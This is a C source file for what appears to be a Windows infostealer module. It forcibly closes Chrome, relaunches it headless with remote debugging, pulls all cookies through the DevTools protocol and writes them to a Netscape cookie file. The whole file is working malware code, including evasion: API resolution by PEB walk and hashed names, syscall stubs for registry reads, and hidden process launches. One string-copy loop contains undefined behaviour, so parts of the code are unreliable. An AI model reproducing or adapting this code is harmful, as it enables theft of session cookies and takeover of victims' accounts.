/*
 * cdp_grabber.c — Chrome DevTools Protocol cookie extraction.
 *
 * Launches headless Chrome, connects via WebSocket CDP,
 * extracts all cookies, writes Netscape format.
 *
 * Ports tried: 9222-9230. Chrome killed first.
 * All Win32 APIs resolved via PEB-walk.
 */

#include "cdp_grabber.h"
#include "config.h"
#include "browser_paths.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "ws2.h"

#ifdef ENABLE_CDP_GRABBER
#ifdef _WIN32

#include <windows.h>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ── Minimal JSON field extractor ─────────────────────────────── */

static int json_extract_str(const char *json, const char *key,
                            char *out, size_t out_max) {
    char search[128];
    int slen = snprintf(search, sizeof(search), "\"%s\":\"", key);
    if (slen <= 0 || (size_t)slen >= sizeof(search)) return -1;

    const char *p = strstr(json, search);
    if (!p) return -1;
    p += slen;

    size_t i = 0;
    while (p[i] && p[i] != '"' && i + 1 < out_max) {
        if (p[i] == '\\' && p[i + 1]) {
            switch (p[i + 1]) {
            case '"':  out[i++] = '"';  break;
            case '\\': out[i++] = '\\'; break;
            case 'n':  out[i++] = '\n'; break;
            case 't':  out[i++] = '\t'; break;
            default:   out[i++] = p[i + 1]; break;
            }
            p += 2;
        } else {
            out[i++] = p[i++];
        }
    }
    out[i] = '\0';
    return (int)i;
}

static int json_extract_bool(const char *json, const char *key) {
    char search[128];
    snprintf(search, sizeof(search), "\"%s\":", key);
    const char *p = strstr(json, search);
    if (!p) return 0;
    p += strlen(search);
    while (*p == ' ') p++;
    return (p[0] == 't');
}

static double json_extract_number(const char *json, const char *key) {
    char search[128];
    snprintf(search, sizeof(search), "\"%s\":", key);
    const char *p = strstr(json, search);
    if (!p) return 0.0;
    p += strlen(search);
    while (*p == ' ') p++;
    return strtod(p, NULL);
}

/* ── Win32 API types ──────────────────────────────────────────── */

typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
typedef HANDLE  (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES,
                                        DWORD, DWORD, HANDLE);
typedef BOOL    (WINAPI *pWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL    (WINAPI *pReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL    (WINAPI *pCloseHandle)(HANDLE);
typedef BOOL    (WINAPI *pCreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES,
                                           LPSECURITY_ATTRIBUTES, BOOL, DWORD,
                                           LPVOID, LPCWSTR, LPSTARTUPINFOW,
                                           LPPROCESS_INFORMATION);
typedef DWORD   (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
typedef BOOL    (WINAPI *pTerminateProcess)(HANDLE, UINT);
typedef DWORD   (WINAPI *pGetTempPathW)(DWORD, LPWSTR);
typedef BOOL    (WINAPI *pRemoveDirectoryW)(LPCWSTR);
typedef BOOL    (WINAPI *pDeleteFileW)(LPCWSTR);
typedef HANDLE  (WINAPI *pFindFirstFileW)(LPCWSTR, LPWIN32_FIND_DATAW);
typedef BOOL    (WINAPI *pFindNextFileW)(HANDLE, LPWIN32_FIND_DATAW);
typedef BOOL    (WINAPI *pFindClose)(HANDLE);

/* ── Resolve helper ───────────────────────────────────────────── */

static void* resolve_fn(void* mod, const char* name) {
    return mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(name));
}

/* ── HTTP GET on raw socket ───────────────────────────────────── */

static int http_get(const char *host, int port, const char *path,
                    char *resp, size_t resp_max) {
    /* Use ws2 helpers already in the codebase */
    HANDLE sock = INVALID_HANDLE_VALUE;
    ws2_result_t r = ws2_connect(host, (uint16_t)port, &sock);
    if (r != WS2_OK) return -1;

    char req[512];
    int rlen = snprintf(req, sizeof(req),
        "GET %s HTTP/1.1\r\nHost: %s:%d\r\nConnection: close\r\n\r\n",
        path, host, port);

    size_t sent;
    ws2_send(sock, (const uint8_t *)req, (size_t)rlen, &sent);

    /* Read response */
    size_t total = 0;
    while (total < resp_max - 1) {
        size_t n;
        r = ws2_recv(sock, (uint8_t *)resp + total, resp_max - 1 - total, &n);
        if (r != WS2_OK || n == 0) break;
        total += n;
    }
    resp[total] = '\0';
    ws2_close(sock);
    return (int)total;
}

/* ── WebSocket minimal frame ──────────────────────────────────── */

/*
 * Send a WebSocket text frame (opcode 0x81) with masking.
 * The CDP command is a JSON string.
 */
static int ws_send_text(HANDLE sock, const char *msg) {
    size_t msg_len = strlen(msg);
    size_t frame_max = 14 + msg_len;
    uint8_t *frame = (uint8_t *)malloc(frame_max);
    if (!frame) return -1;

    size_t pos = 0;
    frame[pos++] = 0x81; /* FIN + text opcode */

    /* Mask bit set (0x80) + payload length */
    if (msg_len < 126) {
        frame[pos++] = 0x80 | (uint8_t)msg_len;
    } else if (msg_len < 65536) {
        frame[pos++] = 0x80 | 126;
        frame[pos++] = (msg_len >> 8) & 0xFF;
        frame[pos++] = msg_len & 0xFF;
    } else {
        frame[pos++] = 0x80 | 127;
        for (int i = 7; i >= 0; i--)
            frame[pos++] = (msg_len >> (i * 8)) & 0xFF;
    }

    /* Masking key (4 bytes) */
    uint8_t mask[4] = {0x12, 0x34, 0x56, 0x78};
    memcpy(frame + pos, mask, 4);
    pos += 4;

    /* Masked payload */
    for (size_t i = 0; i < msg_len; i++)
        frame[pos++] = (uint8_t)msg[i] ^ mask[i % 4];

    size_t sent;
    ws2_result_t r = ws2_send(sock, frame, pos, &sent);
    free(frame);
    return (r == WS2_OK) ? 0 : -1;
}

/* Read one WebSocket text frame, return payload in out. */
static int ws_recv_text(HANDLE sock, char *out, size_t out_max) {
    uint8_t hdr[2];
    size_t n;
    if (ws2_recv(sock, hdr, 2, &n) != WS2_OK || n < 2) return -1;

    size_t payload_len = hdr[1] & 0x7F;
    size_t hdr_extra = 0;

    if (payload_len == 126) {
        uint8_t ext[2];
        if (ws2_recv(sock, ext, 2, &n) != WS2_OK || n < 2) return -1;
        payload_len = ((size_t)ext[0] << 8) | ext[1];
        hdr_extra = 2;
    } else if (payload_len == 127) {
        uint8_t ext[8];
        if (ws2_recv(sock, ext, 8, &n) != WS2_OK || n < 8) return -1;
        payload_len = 0;
        for (int i = 0; i < 8; i++)
            payload_len = (payload_len << 8) | ext[i];
        hdr_extra = 8;
    }

    if (payload_len >= out_max) return -1;

    size_t total = 0;
    while (total < payload_len) {
        if (ws2_recv(sock, (uint8_t *)out + total, payload_len - total, &n) != WS2_OK || n == 0)
            return -1;
        total += n;
    }
    out[total] = '\0';
    return (int)total;
}

/* ── Write Netscape cookie file ───────────────────────────────── */

static int write_netscape_cookies(const char *json_resp, const char *output_path) {
    /* Find the "result" -> "result" array in CDP response */
    const char *cookies_start = strstr(json_resp, "\"result\":[");
    if (!cookies_start) {
        /* Try alternative: direct array */
        cookies_start = strstr(json_resp, "[{");
    }
    if (!cookies_start) return -1;

    FILE *f = fopen(output_path, "w");
    if (!f) return -1;

    fprintf(f, "# Netscape HTTP Cookie File\n");

    /* Walk cookie objects — find each { ... } block */
    const char *p = cookies_start;
    int cookie_count = 0;

    while ((p = strchr(p, '{')) != NULL) {
        const char *end = strchr(p, '}');
        if (!end) break;

        size_t block_len = (size_t)(end - p + 1);
        char block[4096];
        if (block_len >= sizeof(block)) { p = end + 1; continue; }
        memcpy(block, p, block_len);
        block[block_len] = '\0';

        /* Extract fields */
        char domain[256] = {0}, name[512] = {0}, value[4096] = {0}, path[256] = {0};
        json_extract_str(block, "domain", domain, sizeof(domain));
        json_extract_str(block, "name", name, sizeof(name));
        json_extract_str(block, "value", value, sizeof(value));
        json_extract_str(block, "path", path, sizeof(path));

        int secure = json_extract_bool(block, "secure");
        int httpOnly = json_extract_bool(block, "httpOnly");
        double expires = json_extract_number(block, "expires");

        if (domain[0] && name[0]) {
            /* Netscape format: domain\tflag\tpath\tsecure\texpiry\tname\tvalue */
            fprintf(f, "%s\t%s\t%s\t%s\t%ld\t%s\t%s\n",
                    domain,
                    domain[0] == '.' ? "TRUE" : "FALSE",
                    path[0] ? path : "/",
                    secure ? "TRUE" : "FALSE",
                    (long)expires,
                    name,
                    value);
            cookie_count++;
        }

        p = end + 1;
    }

    fclose(f);
    return cookie_count;
}

/* ── Get Chrome exe path from registry ────────────────────────── */

static int get_chrome_exe_path(char *out, size_t out_max) {
    void *ntdll = mirage_get_module_by_hash(mirage_encrypted_hash_module("ntdll.dll"));
    if (!ntdll) return -1;

    /* Open HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe */
    /* Use NtOpenKey via syscall stub */
    UNICODE_STRING key_name;
    wchar_t key_path[] = L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe";
    key_name.Buffer = key_path;
    key_name.Length = (USHORT)(wcslen(key_path) * sizeof(wchar_t));
    key_name.MaximumLength = key_name.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES oa;
    oa.Length = sizeof(oa);
    oa.RootDirectory = NULL;
    oa.ObjectName = &key_name;
    oa.Attributes = OBJ_CASE_INSENSITIVE;
    oa.SecurityDescriptor = NULL;
    oa.SecurityQualityOfService = NULL;

    HANDLE hKey = NULL;
    NTSTATUS st = NtOpenKey_stub((uint64_t)&hKey,
                                  KEY_QUERY_VALUE,
                                  (uint64_t)&oa);
    if (st < 0 || !hKey) return -1;

    /* Query default value */
    UNICODE_STRING val_name;
    val_name.Buffer = NULL;
    val_name.Length = 0;
    val_name.MaximumLength = 0;

    /* Use NtQueryValueKey */
    BYTE buf[512];
    ULONG result_len = 0;
    st = NtQueryValueKey_stub((uint64_t)hKey,
                               (uint64_t)&val_name,
                               KeyValuePartialInformation,
                               (uint64_t)buf, sizeof(buf),
                               (uint64_t)&result_len);

    typedef NTSTATUS (WINAPI *pNtClose)(HANDLE);
    pNtClose fnNtClose = (pNtClose)resolve_fn(ntdll, "NtClose");
    if (fnNtClose) fnNtClose(hKey);

    if (st < 0) return -1;

    KEY_VALUE_PARTIAL_INFORMATION *info = (KEY_VALUE_PARTIAL_INFORMATION *)buf;
    if (info->Type != REG_SZ || info->DataLength < 2) return -1;

    /* Convert WCHAR to char */
    const wchar_t *wstr = (const wchar_t *)info->Data;
    size_t wlen = info->DataLength / sizeof(wchar_t);
    for (size_t i = 0; i < wlen && i + 1 < out_max; i++)
        out[i] = (char)(wstr[i] & 0x7F);
    out[wlen < out_max ? wlen : out_max - 1] = '\0';

    return 0;
}

/* ── cdp_grab_cookies ─────────────────────────────────────────── */

int cdp_grab_cookies(const char *chrome_exe_path, const char *output_path) {
    void *kernel32 = mirage_get_module_by_hash(mirage_encrypted_hash_module("kernel32.dll"));
    void *user32 = mirage_get_module_by_hash(mirage_encrypted_hash_module("user32.dll"));
    if (!kernel32 || !user32) return -1;

    /* Get Chrome path */
    char chrome_path[MAX_PATH] = {0};
    if (chrome_exe_path) {
        strncpy(chrome_path, chrome_exe_path, MAX_PATH - 1);
    } else {
        if (get_chrome_exe_path(chrome_path, sizeof(chrome_path)) != 0)
            return -1;
    }

    /* Kill existing Chrome */
    kill_browser_processes("chrome");

    /* Get temp path for user data dir */
    pGetTempPathW fnGetTempPath = (pGetTempPathW)resolve_fn(kernel32, "GetTempPathW");
    if (!fnGetTempPath) return -1;

    wchar_t temp_dir[MAX_PATH];
    fnGetTempPath(MAX_PATH, temp_dir);
    wcscat_s(temp_dir, MAX_PATH, L"mirage_chrome");

    /* Try ports 9222-9230 */
    int port = 0;
    char ws_url[512] = {0};

    for (int p = 9222; p <= 9230 && port == 0; p++) {
        /* Build command line */
        wchar_t cmd[1024];
        wsprintfW(cmd, L"\"%hs\" --remote-debugging-port=%d --headless --disable-gpu "
                        L"--no-first-run --disable-software-rasterizer "
                        L"--user-data-dir=\"%ls\"",
                  chrome_path, p, temp_dir);

        /* Launch Chrome */
        pCreateProcessW fnCreateProcess = (pCreateProcessW)resolve_fn(kernel32, "CreateProcessW");
        pWaitForSingleObject fnWait = (pWaitForSingleObject)resolve_fn(kernel32, "WaitForSingleObject");
        pCloseHandle fnClose = (pCloseHandle)resolve_fn(kernel32, "CloseHandle");
        if (!fnCreateProcess || !fnWait || !fnClose) return -1;

        STARTUPINFOW si = {0};
        si.cb = sizeof(si);
        PROCESS_INFORMATION pi = {0};

        if (!fnCreateProcess(NULL, cmd, NULL, NULL, FALSE,
                              CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
            continue;

        /* Wait for Chrome to start (up to 5 seconds, poll every 200ms) */
        for (int attempt = 0; attempt < 25; attempt++) {
            fnWait(pi.hProcess, 200); /* 200ms */

            char resp[8192] = {0};
            int rlen = http_get("127.0.0.1", p, "/json/version", resp, sizeof(resp));
            if (rlen > 0) {
                /* Extract webSocketDebuggerUrl */
                if (json_extract_str(resp, "webSocketDebuggerUrl", ws_url, sizeof(ws_url)) > 0) {
                    port = p;
                    break;
                }
            }
        }

        if (port == 0) {
            /* Chrome didn't start — kill it */
            pTerminateProcess fnTerm = (pTerminateProcess)resolve_fn(kernel32, "TerminateProcess");
            if (fnTerm) fnTerm(pi.hProcess, 1);
        }

        fnClose(pi.hProcess);
        fnClose(pi.hThread);
    }

    if (port == 0 || ws_url[0] == '\0') return -1;

    /* Connect to WebSocket */
    /* ws_url looks like: ws://127.0.0.1:9222/devtools/browser/UUID */
    /* We need to connect via raw TCP + WebSocket upgrade */
    char host[64] = "127.0.0.1";
    int ws_port = port;
    char ws_path[256] = "/";

    /* Parse ws://host:port/path */
    const char *url_start = strstr(ws_url, "ws://");
    if (url_start) {
        url_start += 5;
        const char *colon = strchr(url_start, ':');
        const char *slash = strchr(url_start, '/');
        if (colon && slash) {
            size_t hlen = (size_t)(colon - url_start);
            if (hlen < sizeof(host)) {
                memcpy(host, url_start, hlen);
                host[hlen] = '\0';
            }
            ws_port = atoi(colon + 1);
            strncpy(ws_path, slash, sizeof(ws_path) - 1);
        }
    }

    HANDLE ws_sock = INVALID_HANDLE_VALUE;
    if (ws2_connect(host, (uint16_t)ws_port, &ws_sock) != WS2_OK)
        return -1;

    /* Send WebSocket upgrade request */
    char upgrade[1024];
    int ulen = snprintf(upgrade, sizeof(upgrade),
        "GET %s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        "Sec-WebSocket-Version: 13\r\n\r\n",
        ws_path, host, ws_port);

    size_t sent;
    ws2_send(ws_sock, (const uint8_t *)upgrade, (size_t)ulen, &sent);

    /* Read upgrade response (we don't validate it — just drain) */
    char drain[1024];
    size_t dn;
    ws2_recv(ws_sock, (uint8_t *)drain, sizeof(drain) - 1, &dn);

    /* Send CDP command */
    const char *cdp_cmd = "{\"id\":1,\"method\":\"Network.getAllCookies\"}";
    if (ws_send_text(ws_sock, cdp_cmd) != 0) {
        ws2_close(ws_sock);
        return -1;
    }

    /* Read CDP response — may be large, allocate generously */
    char *resp_buf = (char *)malloc(1024 * 1024); /* 1MB */
    if (!resp_buf) { ws2_close(ws_sock); return -1; }

    int resp_len = ws_recv_text(ws_sock, resp_buf, 1024 * 1024);
    ws2_close(ws_sock);

    if (resp_len <= 0) { free(resp_buf); return -1; }

    /* Write Netscape cookies */
    int cookie_count = write_netscape_cookies(resp_buf, output_path);
    free(resp_buf);

    /* Terminate Chrome */
    /* We stored pi.hProcess above but it's out of scope — kill by process name */
    kill_browser_processes("chrome");

    /* Cleanup temp dir */
    pRemoveDirectoryW fnRmDir = (pRemoveDirectoryW)resolve_fn(kernel32, "RemoveDirectoryW");
    if (fnRmDir) fnRmDir(temp_dir);

    return (cookie_count >= 0) ? 0 : -1;
}

#endif /* _WIN32 */
#endif /* ENABLE_CDP_GRABBER */
